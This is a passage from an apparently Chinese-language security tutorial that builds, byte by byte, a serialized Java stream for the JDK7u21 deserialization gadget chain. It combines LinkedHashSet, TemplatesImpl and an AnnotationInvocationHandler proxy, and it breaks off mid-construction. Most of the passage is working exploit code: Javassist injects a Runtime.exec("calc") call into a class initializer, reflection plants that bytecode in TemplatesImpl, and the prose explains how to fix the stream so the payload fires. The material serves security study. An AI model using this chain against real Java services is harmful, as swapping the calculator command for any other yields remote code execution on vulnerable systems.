</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">HashSet</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">values</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectAnnotation</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">TC_BLOCKDATA</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x77</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Length</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">12</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x0c</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Contents</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x000000103f40000000000001</span>	<span style="color:#7f848e">//末尾表示元素个数
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    
</span></span><span style="display:flex;"><span>    		<span style="color:#7f848e">//linkedHashSet的第一个元素
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    		<span style="color:#e06c75">hashMap</span>
</span></span><span style="display:flex;"><span>    		
</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">TC_ENDBLOCKDATA</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x78</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">LinkedHashSet</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">values</span>
</span></span></code></pre></div><p><code>hashMap</code>部分我做了简化，因为它的内部不涉及任何改动，所以直接用<code>hashMap</code>表示了~</p>
<p>读懂之后，我们开始进行<code>JDK7u21</code>原生链的字节流构造</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>		<span style="color:#56b6c2">...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">serializedObject</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">STREAM_MAGIC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">STREAM_VERSION</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">//Contents
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                          <span style="color:#7f848e">//className
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                          <span style="color:#e06c75">LinkedHashSet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                          <span style="color:#7f848e">//seriavalVersionUID
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                          <span style="color:#56b6c2">-</span><span style="color:#d19a66">2851667679971038690L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                          <span style="color:#7f848e">//classDescFlags
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                          <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                          <span style="color:#7f848e">//fieldCount
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                          <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                          <span style="color:#7f848e">//classAnnotations
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                          <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                          <span style="color:#7f848e">//superClassDesc
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                              <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                              <span style="color:#7f848e">//className
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                              <span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                              <span style="color:#7f848e">//seriavalVersionUID
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                              <span style="color:#56b6c2">-</span><span style="color:#d19a66">5024744406713321676L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                              <span style="color:#7f848e">//classDescFlags
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                              <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)(</span><span style="color:#e06c75">SC_WRITE_METHOD</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">),</span>
</span></span><span style="display:flex;"><span>                              <span style="color:#7f848e">//fieldCount
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                              <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                              <span style="color:#7f848e">//classAnnotations
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                              <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                              <span style="color:#7f848e">//superClassDesc
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                              <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                          <span style="color:#7f848e">//java.util.HashSet
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#7f848e">//ObjectAnnotation
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                              <span style="color:#e06c75">TC_BLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">12</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">16</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">16192</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>   <span style="color:#7f848e">//元素个数
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#7f848e">//contents
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#7f848e">//LinkedHashSet的第一个元素
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                <span style="color:#7f848e">//LinkedHashSet的第二个元素
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#e06c75">proxy</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">TC_ENDBLOCKDATA</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">};</span>
</span></span><span style="display:flex;"><span>		<span style="color:#56b6c2">...</span>
</span></span></code></pre></div><p>在构造时要注意以下细节：</p>
<ul>
<li>根据数据长度选择合适的类型，例如<code>0x01</code>选择<code>byte</code>类型，<code>0x00 02</code>选择<code>short</code>类型（或者直接往里塞<code>0x00</code>，用不着这么麻烦）</li>
<li>忽略<code>newHandle</code>，上面的<code>newHandle</code>是<code>SerializationDumper</code>为了使用者方便分析而自行添加的。真正的<code>newHandle</code>在反序列化时才被分配</li>
</ul>
<p>运行之后发现并没有弹出计算器</p>
<p>原因是<code>proxy</code>里面<code>memberValue</code>的<code>templatesImpl</code>没有引用<code>LinkedHashSet</code>的<code>templatesImpl</code>，所以不是同一个对象</p>
<p>所以我们要重新构造<code>proxy</code>的部分</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">SerializationAnalysis</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">test</span><span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">CannotCompileException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NoSuchFieldException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IllegalAccessException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NoSuchMethodException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InvocationTargetException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InstantiationException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ClassPool</span> <span style="color:#e06c75">pool</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ClassPool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDefault</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">CtClass</span> <span style="color:#e06c75">cc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">test</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">cmd</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeClassInitializer</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">insertBefore</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">cmd</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setSuperclass</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">AbstractTranslet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">())));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TemplatesImpl</span> <span style="color:#e06c75">templatesImpl</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">TemplatesImpl</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span> <span style="color:#e06c75">tc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">nameField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_name&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#98c379">&#34;a&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">bytecodesField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_bytecodes&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">codes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toBytecode</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]</span> <span style="color:#e06c75">bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]{</span><span style="color:#e06c75">codes</span><span style="color:#56b6c2">};</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">tfactoryField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_tfactory&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#c678dd">new</span> <span style="color:#e06c75">TransformerFactoryImpl</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">aClass</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">forName</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Constructor</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">aClass</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredConstructor</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">hashMap</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;f5a5a608&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">InvocationHandler</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">InvocationHandler</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Templates</span> <span style="color:#e06c75">proxy</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">Proxy</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newProxyInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ClassLoader</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getSystemClassLoader</span><span style="color:#56b6c2">(),</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">[]{</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">},</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">serializedObject</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">STREAM_MAGIC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">STREAM_VERSION</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">//Contents
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                    <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//className
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                        <span style="color:#e06c75">LinkedHashSet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//seriavalVersionUID
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                        <span style="color:#56b6c2">-</span><span style="color:#d19a66">2851667679971038690L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//classDescFlags
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//fieldCount
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                        <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//classAnnotations
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                        <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//superClassDesc
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//className
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//seriavalVersionUID
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#56b6c2">-</span><span style="color:#d19a66">5024744406713321676L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//classDescFlags
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)(</span><span style="color:#e06c75">SC_WRITE_METHOD</span><span style="color:#56b6c2">|</span><span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">),</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//fieldCount
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//classAnnotations
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//superClassDesc
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#7f848e">//classdata
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                          <span style="color:#7f848e">//java.util.HashSet
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#7f848e">//ObjectAnnotation
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#e06c75">TC_BLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">12</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">16</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">16192</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#56b6c2">(</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">)</span><span style="color:#d19a66">2</span><span style="color:#56b6c2">,</span>   <span style="color:#7f848e">//元素个数
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#7f848e">//contents
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#7f848e">//LinkedHashSet的第一个元素templatesImpl
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>                            <span style="color:#7f848e">//LinkedHashSet的第二个元素proxy
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                            <span style="color:#e06c75">TC_OBJECT</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#e06c75">TC_PROXYCLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#e06c75">TC_ENDBLOCKDATA</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                    <span style="color:#7f848e">//superclass
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                        <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#e06c75">Proxy</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">(),</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#56b6c2">-</span><span style="color:#d19a66">2222568056686623797L</span><span style="color:#56b6c2">,</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#e06c75">SC_SERIALIZABLE</span><span style="color:#56b6c2">,</span>
